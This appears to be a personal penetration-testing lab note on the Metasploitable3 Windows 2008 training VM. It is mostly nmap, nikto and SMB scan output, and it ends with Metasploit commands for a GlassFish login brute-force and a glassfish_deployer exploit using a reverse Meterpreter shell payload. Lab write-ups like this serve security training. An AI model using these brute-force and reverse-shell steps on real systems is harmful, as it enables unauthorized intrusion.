# Metaspliotable3 (win2k8)

## Nmap
```
sudo nmap -A 192.168.1.118
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 09:53 EDT
Nmap scan report for 192.168.1.118
Host is up (0.00067s latency).
Not shown: 979 closed tcp ports (reset)
PORT      STATE SERVICE              VERSION
21/tcp    open  ftp                  Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:66:45:18:a2:68:21:72:fd:26:9d:d3:2f:5e:d4:7f (RSA)
|_  521 7b:74:f2:b1:2f:ea:93:40:e5:2d:33:fc:2a:69:d1:8f (ECDSA)
80/tcp    open  http                 Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
3306/tcp  open  mysql                MySQL 5.5.20-log
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.20-log                                                                                                                                                                                                                     
|   Thread ID: 6                                                                                                                                                                                                                            
|   Capabilities flags: 63487                                                                                                                                                                                                               
|   Some Capabilities: InteractiveClient, LongColumnFlag, LongPassword, Speaks41ProtocolOld, SupportsTransactions, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, ODBCClient, FoundRows, SupportsLoadDataLocal, Support41Auth, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins                                                                                      
|   Status: Autocommit                                                                                                                                                                                                                      
|   Salt: yY33C7+on[_H-H`,XX32                                                                                                                                                                                                              
|_  Auth Plugin Name: mysql_native_password                                                                                                                                                                                                 
3389/tcp  open  tcpwrapped                                                                                                                                                                                                                  
| ssl-cert: Subject: commonName=10-SALVATION                                                                                                                                                                                                
| Not valid before: 2025-05-15T00:20:52
|_Not valid after:  2025-11-14T00:20:52
| rdp-ntlm-info: 
|   Target_Name: 10-SALVATION
|   NetBIOS_Domain_Name: 10-SALVATION
|   NetBIOS_Computer_Name: 10-SALVATION
|   DNS_Domain_Name: 10-SALVATION
|   DNS_Computer_Name: 10-SALVATION
|   Product_Version: 6.1.7601
|_  System_Time: 2025-06-09T13:54:33+00:00
|_ssl-date: 2025-06-09T13:54:53+00:00; +1s from scanner time.
4848/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
|_http-server-header: GlassFish Server Open Source Edition  4.0 
|_http-title: Did not follow redirect to https://192.168.1.118:4848/
|_ssl-date: 2025-06-09T13:54:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7676/tcp  open  java-message-service Java Message Service 301
8009/tcp  open  ajp13                Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
|_http-title: GlassFish Server - Server Running
|_http-server-header: GlassFish Server Open Source Edition  4.0 
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
8181/tcp  open  ssl/intermapper?
|_ssl-date: 2025-06-09T13:54:53+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 09 Jun 2025 13:53:53 GMT
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 4626
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html lang="en">
|     <!--
|     ALTER OR REMOVE COPYRIGHT NOTICES OR THIS HEADER.
|     Copyright (c) 2010, 2013 Oracle and/or its affiliates. All rights reserved.
|     subject to License Terms
|     <head>
|     <style type="text/css">
|     body{margin-top:0}
|     body,td,p,div,span,a,ul,ul li, ol, ol li, ol li b, dl,h1,h2,h3,h4,h5,h6,li {font-family:geneva,helvetica,arial,"lucida sans",sans-serif; font-size:10pt}
|     {font-size:18pt}
|     {font-size:14pt}
|     {font-size:12pt}
|     code,kbd,tt,pre {font-family:monaco,courier,"courier new"; font-size:10pt;}
|     {padding-bottom: 8px}
|     p.copy, p.copy a {font-family:geneva,helvetica,arial,"lucida sans",sans-serif; font-size:8pt}
|     p.copy {text-align: center}
|     table.grey1,tr.grey1,td.g
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Allow: GET
|     Date: Mon, 09 Jun 2025 13:53:53 GMT
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Mon, 09 Jun 2025 13:53:53 GMT
|     Connection: close
|_    Content-Length: 0
8383/tcp  open  http                 Apache httpd
|_http-title: 400 Bad Request
|_http-server-header: Apache
9200/tcp  open  http                 Elasticsearch REST API 1.1.1 (name: Nomad; Lucene 4.7)
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
49152/tcp open  msrpc                Microsoft Windows RPC
49153/tcp open  msrpc                Microsoft Windows RPC
49154/tcp open  msrpc                Microsoft Windows RPC
49175/tcp open  java-rmi             Java RMI
49176/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8181-TCP:V=7.95%T=SSL%I=7%D=6/9%Time=6846E771%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,128C,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2009\x20Ju
SF:n\x202025\x2013:53:53\x20GMT\r\nContent-Type:\x20text/html\r\nConnectio
SF:n:\x20close\r\nContent-Length:\x204626\r\n\r\n<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\">\n<html\x20l
SF:ang=\"en\">\n<!--\nDO\x20NOT\x20ALTER\x20OR\x20REMOVE\x20COPYRIGHT\x20N
SF:OTICES\x20OR\x20THIS\x20HEADER\.\n\nCopyright\x20\(c\)\x202010,\x202013
SF:\x20Oracle\x20and/or\x20its\x20affiliates\.\x20All\x20rights\x20reserve
SF:d\.\n\nUse\x20is\x20subject\x20to\x20License\x20Terms\n-->\n<head>\n<st
SF:yle\x20type=\"text/css\">\n\tbody{margin-top:0}\n\tbody,td,p,div,span,a
SF:,ul,ul\x20li,\x20ol,\x20ol\x20li,\x20ol\x20li\x20b,\x20dl,h1,h2,h3,h4,h
SF:5,h6,li\x20{font-family:geneva,helvetica,arial,\"lucida\x20sans\",sans-
SF:serif;\x20font-size:10pt}\n\th1\x20{font-size:18pt}\n\th2\x20{font-size
SF::14pt}\n\th3\x20{font-size:12pt}\n\tcode,kbd,tt,pre\x20{font-family:mon
SF:aco,courier,\"courier\x20new\";\x20font-size:10pt;}\n\tli\x20{padding-b
SF:ottom:\x208px}\n\tp\.copy,\x20p\.copy\x20a\x20{font-family:geneva,helve
SF:tica,arial,\"lucida\x20sans\",sans-serif;\x20font-size:8pt}\n\tp\.copy\
SF:x20{text-align:\x20center}\n\ttable\.grey1,tr\.grey1,td\.g")%r(HTTPOpti
SF:ons,7A,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nAllow:\x20GET\r
SF:\nDate:\x20Mon,\x2009\x20Jun\x202025\x2013:53:53\x20GMT\r\nConnection:\
SF:x20close\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,76,"HTTP/1\.1\
SF:x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:\x20Mon,\x2009\x2
SF:0Jun\x202025\x2013:53:53\x20GMT\r\nConnection:\x20close\r\nContent-Leng
SF:th:\x200\r\n\r\n");
MAC Address: 00:0C:29:95:B5:D0 (VMware)
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-09T13:54:32
|_  start_date: 2025-06-09T13:50:22
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: 10-SALVATION, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:95:b5:d0 (VMware)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h00m00s, deviation: 2h38m44s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: 10-SALVATION
|   NetBIOS computer name: 10-SALVATION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-09T06:54:30-07:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.67 ms 192.168.1.118

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.82 seconds

```

## Ports

### 21
![Pasted image 20250609091443](../zzAttachments/Pasted%20image%2020250609091443.png)
- no anonymous login
### 22
![Pasted image 20250609091601](../zzAttachments/Pasted%20image%2020250609091601.png)
### 80
![Pasted image 20250609091817](../zzAttachments/Pasted%20image%2020250609091817.png)

##### nikto
```
nikto -h 192.168.1.118
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.118
+ Target Hostname:    192.168.1.118
+ Target Port:        80
+ Start Time:         2025-06-09 10:18:34 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ /: Retrieved x-powered-by header: ASP.NET.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /Qco9A9kE.asmx: Retrieved x-aspnet-version header: 2.0.50727.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ ERROR: Error limit (20) reached for host, giving up. Last error: 
+ Scan terminated: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-06-09 10:21:56 (GMT-4) (202 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### 135
### 139
### 445
##### Nmap scripts
```
Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0
| smb-mbenum: 
|_  ERROR: Call to Browser Service failed with status = 2184
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
|_smb-vuln-ms10-054: false
|_smb-print-text: false
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-brute: 
|_  guest:<blank> => Valid credentials, account disabled
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
| smb2-time: 
|   date: 2025-06-09T14:21:34
|_  start_date: 2025-06-09T13:50:22
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: 10-SALVATION
|   NetBIOS computer name: 10-SALVATION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-09T07:22:17-07:00
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\192.168.1.118\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\192.168.1.118\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\192.168.1.118\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ

Nmap done: 1 IP address (1 host up) scanned in 51.14 seconds
```
### 3306

##### Nmap 
```
3306/tcp  open  mysql
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.20-log
|   Thread ID: 14
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, Support41Auth, ODBCClient, SupportsCompression, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, InteractiveClient, SupportsTransactions, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, LongColumnFlag, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: l$g]}{sQz2)v7PlN#a@\
|_  Auth Plugin Name: mysql_native_password
| mysql-brute: 
|   Accounts: 
|     root:<empty> - Valid credentials
|_  Statistics: Performed 45010 guesses in 16 seconds, average tps: 2813.1
```
### 3389

### 4848
##### whatweb
```
whatweb 192.168.1.118:4848 -a3
http://192.168.1.118:4848 [302 Found] Country[RESERVED][ZZ], IP[192.168.1.118], RedirectLocation[https://192.168.1.118:4848/]
https://192.168.1.118:4848/ [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], HTTPServer[GlassFish Server Open Source Edition  4.0], HttpOnly[JSESSIONID], IP[192.168.1.118], Java[2.3][Servlet/3.1], PasswordField[j_password], Prototype, Script[text/javascript], Sun-GlassFish[ 4.0][Open Source Edition], Title[Login], X-Powered-By[Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.0  Java/Oracle Corporation/1.8)]
```

#### metasploit
##### glassfish_login scanner
```
use auxiliary/scanner/http/glassfish_login
set rhosts 192.168.1.118
set rport 4848
set STOP_ON_SUCCESS true
set PASS_FILE your/list
```
![Pasted image 20250609102116](../zzAttachments/Pasted%20image%2020250609102116.png)
![Pasted image 20250609102148](../zzAttachments/Pasted%20image%2020250609102148.png)

##### glassfish_deployer
```
set rhosts 192.168.1.118
set PASSWORD sploit
use exploit/multi/http/glassfish_deployer
set target 1
set payload java/meterpreter/reverse_tcp
set SSL false
```
	- target 1 = Java Universal

### 5985
### 7676
### 8009
### 8080
### 8181
### 8383
### 9200
### 49152/49153/49154/49175/49176
